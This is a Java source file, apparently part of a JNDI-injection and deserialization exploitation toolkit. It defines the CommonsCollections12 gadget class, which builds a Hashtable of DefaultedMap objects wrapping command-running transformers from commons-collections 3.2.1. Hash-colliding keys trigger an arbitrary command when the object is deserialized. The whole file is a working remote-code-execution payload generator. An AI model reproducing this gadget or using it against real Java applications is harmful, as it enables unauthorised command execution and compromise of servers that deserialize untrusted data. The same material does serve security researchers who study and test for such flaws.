package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.DefaultedMap;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollections12 implements ObjectPayload<Hashtable> {
    @Override
    public Hashtable getObject(PayloadType type, String... param) throws Exception {
        String              command       = param[0];
        final Transformer[] transformers  = TransformerUtil.makeTransformer(command);
        Map                 hashMap1      = new HashMap();
        Map                 hashMap2      = new HashMap();
        DefaultedMap        defaultedMap1 = (DefaultedMap) DefaultedMap.decorate(hashMap1, transformers);
        DefaultedMap        defaultedMap2 = (DefaultedMap) DefaultedMap.decorate(hashMap2, transformers);

        defaultedMap1.put("yy", 1);
        defaultedMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(defaultedMap1, 1);
        hashtable.put(defaultedMap2, 1);
        defaultedMap2.remove("yy");

        return hashtable;
    }
}
